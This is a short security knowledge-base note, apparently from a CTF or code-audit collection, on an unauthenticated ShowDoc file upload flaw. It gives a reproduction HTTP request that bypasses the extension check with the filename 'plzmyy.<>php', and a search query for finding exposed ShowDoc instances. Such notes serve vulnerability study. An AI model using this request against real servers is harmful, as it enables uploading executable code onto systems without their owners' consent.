---
title: ShowDoc 前台文件上传漏洞
category: code-audit
tags: [showdoc, file-upload, rce, php]
triggers: [showdoc, app="ShowDoc", /server/index.php, uploading, 文件上传]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/ShowDoc 前台文件上传漏洞.md]
---

## Summary

ShowDoc 前台文件上传漏洞，通过修改文件名绕过上传限制。

## Details

### 漏洞复现

```http
POST /server/index.php?s=/home/page/uploading HTTP/1.1

Content-Disposition: form-data; name="editormd-image-file"; filename="plzmyy.<>php"
Content-Type: text/plain

123123test
```

文件名改为 `plzmyy.<>php` 即可绕过上传限制。

### 网络测绘

```
app="ShowDoc"
```

## Connections

- GHSA: [[code-audit/ghsa-rce-patterns]]
- Related: [[kuaipai-cms-file-upload]]
